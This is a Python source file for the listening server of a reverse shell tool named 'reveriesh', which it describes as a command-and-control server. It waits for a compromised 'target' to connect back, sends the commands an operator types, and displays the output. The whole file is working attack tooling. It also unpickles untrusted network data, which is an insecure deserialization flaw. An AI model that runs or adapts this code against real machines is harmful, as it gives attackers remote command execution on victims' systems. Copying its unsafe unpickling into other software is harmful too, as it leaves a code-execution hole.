#!/usr/bin/env python
# -*- coding: utf-8 -*-

""" Really basic reverse shell server in python
"""

from __future__ import print_function
try:
    input = raw_input
except NameError:
    pass

import socket
import sys
import os
import pickle
import time

from reveriesh.common import SIG_REVERIESH, ascii_format


class ReverseShellServer(object):
    def __init__(self, host="", port=80):
        self.host = host
        self.port = port
        self._err_count = 0
        self.last_command = 'ls'

    def socket_create(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except socket.error as msg:
            print("Socket creation error: " + str(msg))
            sys.exit(1)

    def socket_bind(self):
        try:
            print("Binding socket to port: " + str(self.port))
            self.sock.bind((self.host, self.port))
            self.sock.listen(5)
            print("<> listening on {}:{}".format(self.host, self.port))

        except socket.error as msg:
            print("Socket binding error: \n{}\n".format(msg))
            sys.exit(1)
            # socket_bind()

    def accept(self):
        conn, addr = self.sock.accept()
        self.conn = conn
        self.target = addr
        print('target connected {}:{}'.format(addr[0], addr[1]))

    def run_forever(self):
        self.socket_create()
        self.socket_bind()
        while True:
            self.accept()
            try:
                self.run_once()
            except BrokenPipeError:
                print(ascii_format('Broken pipe, restarting', 93))
            except EOFError:
                print(ascii_format('EOF/Broken pipe, restarting', 93))
                self.kill_client()
            finally:
                print(ascii_format('...', 93))

    def run_once(self):
        self.prompt()
        while True:
            try:
                self.send_commands()
            except KeyboardInterrupt:
                print('<!> keyboard interrupt issued. '
                      'type "quit" to stop server')
            except RuntimeError as exc:
                print('this happened: {}'.format(exc))
                self._err_count += 1
                if self._err_count > 3:
                    raise
                    # self.quit(1)
            # finally:
                # print('...')

    def shutdown(self):
        self.sock.shutdown(socket.SHUT_RDWR)

    def close(self):
        self.conn.close()
        time.sleep(0.5)
        self.sock.close()

    def kill_client(self):
        try:
            self.conn.send(SIG_REVERIESH.KILL)
        except BrokenPipeError:
            print('Cannot kill client, pipe already broken')

    def restart_client(self):
        pass

    def quit(self, code=0):
        print('quitting')
        self.kill_client()
        time.sleep(0.5)
        # self.close()
        self.shutdown()

        print('sianara')
        sys.exit(code)

    @staticmethod
    def unmarshall(data):
        try:
            info = pickle.loads(data)
        except:
            print(data)
            raise
        return info

    def prompt(self):
        self.conn.send(SIG_REVERIESH.PROMPT)
        data = self.conn.recv(1024)
        info = self.unmarshall(data)
        print(info['prompt'].decode(), end='')

    def get_input(self):
        # todo: use readline instead
        cmd = input()
        # print(":".join("{:02x}".format(ord(c)) for c in cmd))
        if cmd == '\x14':
            pass # todo: restart call
        if cmd == '\x19' or cmd == 'quit':
            print('Asking for SIGQUIT, quitting')
            self.quit()
        if cmd == '\x1b[A':
            # last command
            print(ascii_format(self.last_command, 'blue'))
            cmd = self.last_command
        return cmd

    def send_commands(self):
            cmd = self.get_input()
            if not cmd:
                self.prompt()
            elif len(str.encode(cmd)) > 0:
                self.last_command = cmd
                self.conn.send(cmd.encode())
                data = self.conn.recv(1024)
                info = self.unmarshall(data)
                if info.get('err', None):
                    print(ascii_format(info['err'].decode(), 'red'))
                if info.get('out', None):
                    print(info['out'].decode(), end='')
                print(info['prompt'].decode(), end='')
            else:
                print('wat')




if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description='python reverse shell server')

    parser.add_argument(
        "-p", "--port", default=80, action="store", type=int,
        help="port of CNC server")
    parser.add_argument(
        "host", nargs='?', default="", type=str, action="store",
        help="Host of CNC server")

    args = parser.parse_args()
    server = ReverseShellServer(args.host, args.port)
    server.run_forever()
